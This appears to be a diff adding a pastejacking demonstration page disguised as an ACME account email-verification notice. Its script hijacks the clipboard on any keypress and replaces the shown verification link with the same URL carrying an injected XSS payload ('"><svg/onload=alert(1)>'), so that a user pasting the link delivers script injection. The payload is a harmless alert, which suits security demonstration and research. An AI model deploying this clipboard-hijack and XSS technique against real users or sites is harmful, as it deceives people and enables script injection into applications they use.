@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Pastejacking the XSS payload</title>
+  <style type="text/css">
+    html {
+      line-height: 1.15;
+      -ms-text-size-adjust: 100%;
+      -webkit-text-size-adjust: 100%;
+    }
+    body {
+      margin: 0;
+      text-align: center;
+      font-family: sans-serif;
+      background: #eee;
+    }
+    .card {
+      padding: 30px;
+      margin: 65px;
+      background: #fff;
+      border: 1px solid grey;
+    }
+    h1 {
+      font-size: 2em;
+      margin-bottom: 0.67em;
+    }
+    br {
+      margin-bottom: 0.67em;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <h1>Verify your email address</h1>
+
+    <p>In order to start using your ACME account, you need to confirm your email address.</p>
+
+    <b>http://example.com/verify/123456789</b>
+    <br>
+    <small>If you did not sign up for this account you can ignore this email and the account will be deleted.</small>
+  </div>
+
+  <script>
+    // Pastejacking demo by https://github.com/dxa4481/Pastejacking
+    function copyTextToClipboard(text) {
+      var textArea = document.createElement("textarea");
+      textArea.style.position = 'fixed';
+      textArea.style.top = 0;
+      textArea.style.left = 0;
+      textArea.style.width = '2em';
+      textArea.style.height = '2em';
+      textArea.style.padding = 0;
+      textArea.style.border = 'none';
+      textArea.style.outline = 'none';
+      textArea.style.boxShadow = 'none';
+      textArea.style.background = 'transparent';
+      textArea.value = text;
+      document.body.appendChild(textArea);
+      textArea.select();
+
+      try {
+        var successful = document.execCommand('copy');
+        var msg = successful ? 'successful' : 'unsuccessful';
+        console.log('Copying text command was ' + msg);
+      } catch (err) {
+        console.log('Oops, unable to copy');
+      }
+
+      document.body.removeChild(textArea);
+    }
+
+    document.addEventListener('keydown', function(event) {
+        var ms = 800;  
+        var start = new Date().getTime();
+        var end = start;
+        while(end < start + ms) {
+            end = new Date().getTime();
+        } 
+        copyTextToClipboard('http//example.com/verify/123456789?q="><svg/onload=alert(1)>"\n');
+    });
+  </script>
+</body>
+</html>
